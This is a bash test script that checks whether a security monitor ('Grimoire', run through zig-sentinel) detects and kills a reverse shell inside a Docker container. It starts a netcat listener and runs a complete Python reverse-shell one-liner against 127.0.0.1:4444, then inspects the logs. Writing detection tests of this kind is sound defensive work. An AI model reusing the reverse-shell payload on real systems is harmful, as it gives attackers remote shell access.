#!/bin/bash
# Test Container Enforcement Mode
# Purpose: Verify Grimoire can terminate attacks inside containers

set -e

echo "═══════════════════════════════════════════════════════════════"
echo "🛡️  PROOF OF SOVEREIGNTY: Container Enforcement Test"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "The Question: Can the Grimoire's authority reach"
echo "              through the walls of the container?"
echo ""
echo "The Test:     Execute a reverse shell inside a Docker container"
echo "              with enforcement mode ENABLED."
echo ""
echo "Success:      Attack process terminated by Grimoire"
echo "Failure:      Attack succeeds, sovereignty violated"
echo ""

# Cleanup
sudo pkill -9 zig-sentinel 2>/dev/null || true
sudo pkill -9 nc 2>/dev/null || true
docker stop test-enforcement-container 2>/dev/null || true
docker rm test-enforcement-container 2>/dev/null || true
sleep 2

cd /home/founder/github_public/guardian-shield

echo "═══════════════════════════════════════════════════════════════"
echo "PHASE 1: PREPARATION"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Check for Docker
if ! command -v docker &> /dev/null; then
    echo "❌ Docker not found - cannot test container enforcement"
    exit 1
fi

# Start listener
echo "1. Starting netcat listener on port 4444..."
nc -lvnp 4444 > /tmp/enforcement-listener.log 2>&1 &
NC_PID=$!
sleep 1
echo "   Listener PID: $NC_PID"

# Start Guardian with ENFORCEMENT MODE
echo ""
echo "2. Starting Guardian with Grimoire ENFORCEMENT MODE..."
sudo ./zig-out/bin/zig-sentinel \
    --enable-grimoire \
    --grimoire-debug \
    --grimoire-enforce \
    --duration=60 \
    > /tmp/enforcement-test.log 2>&1 &
GUARDIAN_PID=$!

echo "   Guardian PID: $GUARDIAN_PID"
echo "   ⚔️  ENFORCEMENT MODE: ACTIVE"
echo "   Waiting 5 seconds for initialization..."
sleep 5

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "PHASE 2: THE TRIAL"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Create container
echo "3. Creating Docker container with Python..."
docker run -d --name test-enforcement-container --network host python:3.11-slim sleep 300 > /dev/null
CONTAINER_ID=$(docker ps -q -f name=test-enforcement-container)
CONTAINER_INIT_PID=$(docker inspect -f '{{.State.Pid}}' test-enforcement-container)

echo "   Container ID: $CONTAINER_ID"
echo "   Container init PID (host perspective): $CONTAINER_INIT_PID"

echo ""
echo "4. Executing Python reverse shell INSIDE container..."
echo "   This should trigger: socket() → connect() → dup2() → execve()"
echo ""

# Execute reverse shell attack inside container
# Note: We run this in background and track its PID (from container's perspective)
docker exec -d test-enforcement-container bash -c '
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"
' 2>&1 &

echo "   Attack launched inside container"
echo "   Waiting 5 seconds for Grimoire detection and enforcement..."
sleep 5

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "PHASE 3: JUDGMENT"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Check if attack was detected
DETECTIONS=$(strings /tmp/enforcement-test.log | grep -c "GRIMOIRE MATCH.*reverse_shell" || echo "0")
TERMINATIONS=$(strings /tmp/enforcement-test.log | grep -c "TERMINATED PID" || echo "0")

echo "5. Analyzing results..."
echo ""
echo "   Detections:    $DETECTIONS"
echo "   Terminations:  $TERMINATIONS"
echo ""

# Check container processes
echo "6. Checking if reverse shell process still exists..."
PYTHON_PROCS=$(docker exec test-enforcement-container ps aux 2>/dev/null | grep -c "python3.*socket" || echo "0")

if [ "$PYTHON_PROCS" -gt 0 ]; then
    echo "   ❌ Python reverse shell still running in container"
    docker exec test-enforcement-container ps aux | grep python
else
    echo "   ✅ No reverse shell process found in container"
fi

# Check listener connection
echo ""
echo "7. Checking if listener received connection..."
if grep -q "connect" /tmp/enforcement-listener.log 2>/dev/null; then
    echo "   ❌ Listener received connection (attack succeeded)"
else
    echo "   ✅ Listener received no connection (attack blocked)"
fi

# Cleanup
echo ""
echo "8. Cleanup..."
docker stop test-enforcement-container > /dev/null 2>&1
docker rm test-enforcement-container > /dev/null 2>&1
kill -9 $NC_PID 2>/dev/null || true
sudo kill -INT $GUARDIAN_PID 2>/dev/null || true
sleep 2

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "VERDICT"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Determine success
SUCCESS=false

if [ "$DETECTIONS" -gt 0 ]; then
    echo "✅ DETECTION: Grimoire saw the attack in the container"
else
    echo "❌ DETECTION FAILED: Grimoire did not detect the attack"
fi

if [ "$TERMINATIONS" -gt 0 ]; then
    echo "✅ ENFORCEMENT: Grimoire terminated the attack process"
    SUCCESS=true
else
    echo "❌ ENFORCEMENT FAILED: No processes were terminated"
fi

if [ "$PYTHON_PROCS" -eq 0 ]; then
    echo "✅ VERIFICATION: Reverse shell process is dead"
else
    echo "⚠️  VERIFICATION: Reverse shell may still be running"
    SUCCESS=false
fi

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo ""

if [ "$SUCCESS" = true ]; then
    echo "🎯 SOVEREIGNTY PROVEN"
    echo ""
    echo "   The Grimoire's authority extends through container walls."
    echo "   The attack was detected and terminated."
    echo "   No kingdom is beyond the Guardian's reach."
    echo ""
    exit 0
else
    echo "⚠️  SOVEREIGNTY UNCERTAIN"
    echo ""
    echo "   The test was inconclusive or enforcement failed."
    echo "   Review logs: /tmp/enforcement-test.log"
    echo ""
    echo "   Possible causes:"
    echo "   - Enforcement mode not fully implemented"
    echo "   - PID namespace issues preventing kill()"
    echo "   - Attack process exited before enforcement"
    echo "   - Race condition in detection timing"
    echo ""
    exit 1
fi
